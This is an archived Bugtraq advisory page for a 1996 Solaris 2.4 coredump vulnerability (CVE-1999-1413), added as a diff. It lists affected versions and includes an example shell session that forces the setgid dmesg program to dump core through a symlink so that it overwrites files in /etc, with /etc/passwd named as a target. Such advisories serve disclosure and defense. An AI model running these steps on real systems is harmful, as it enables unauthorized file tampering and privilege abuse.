@@ -1,0 +1,123 @@
+<p><b><span style="font-size: 18pt;">Solaris Coredump Vulnerbility</span></b></p><br><br><a href="http://www.securityfocus.com/bid/296/info">info</a><br><a href="http://www.securityfocus.com/bid/296/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/296/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/296/solution">solution</a><br><a href="http://www.securityfocus.com/bid/296/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				296
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-1413<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 03 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:16AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerabilty was posted to the Bugtraq mailing list by Jungseok Roh &lt;beren@cosmos.kaist.ac.kr&gt; Sat, 3 Aug 1996.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris  2.4_x86<br/>
+					
+				
+					Sun Solaris  2.4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris 2.5.1 _x86<br/>
+					
+				
+					Sun Solaris 2.5.1 _ppc<br/>
+					
+				
+					Sun Solaris 2.5.1 <br/>
+					
+				
+					Sun Solaris  7.0_x86<br/>
+					
+				
+					Sun Solaris  7.0<br/>
+					
+				
+					Sun Solaris  2.6<br/>
+					
+				
+					Sun Solaris  2.5_x86<br/>
+					
+				
+					Sun Solaris  2.5<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	What follows is an example attack, slightly modified from the origanal Bugtraq posting. <br/><br/>cosmos:beren uname -a<br/>SunOS cosmos 5.4 Generic_101945-32 sun4m sparc<br/>cosmos:beren ls -ald /etc<br/> $)C<br/>   8 drwxrwxr-x  25 root     sys         3584  7 ?y  25 @O   18:46 /etc/<br/>cosmos:beren ls -ald /usr<br/>   2 drwxrwxr-x  30 root     sys         1024  7 ?y   5 @O   17:26 /usr/<br/>cosmos:beren ls -ald /usr/sbin<br/>  10 drwxrwxr-x   4 root     bin         4608  5 ?y  18 @O   03:38 /usr/sbin/<br/>cosmos:beren ls -ald /usr/sbin<br/>  10 drwxrwxr-x   4 root     bin         4608  5 ?y  18 @O   03:38 /usr/sbin/<br/><br/>*NOTE* These directories are group bin writable.<br/><br/>cosmos:beren find /usr -perm -2000 \( -group sys -o -group bin \) ls<br/><br/>*NOTE* Here we look for programs which are in group bin so we can force them to dump core.<br/><br/>cosmos:beren ls -al /usr/sbin/dmesg<br/>  12 -r-xr-sr-x   1 bin      sys         5520 1994  Jul 15 /usr/sbin/dmesg*<br/><br/>*NOTE* Here we identify dmesg(8) as being in the 'bin' group.<br/><br/>cosmos:beren ln -s /etc/SOMETHING core<br/>cosmos:beren stty ^\^cosmos:beren pwd<br/>/tmp<br/>cosmos:beren dmesg<br/>/* then slightly after u type this command kill it . using stty ^\^   there comes the following results */<br/>^C (Core dumped)<br/>comos:beren ls /etc/SOMETHING<br/>SOMETHING<br/><br/><br/>*NOTE* Here we link a random /etc/ file to core. In this instance we simply use SOMETHING as our random filename. You could just as easily use /etc/passwd.
+	
+		<ul>
+</ul>
+</div>
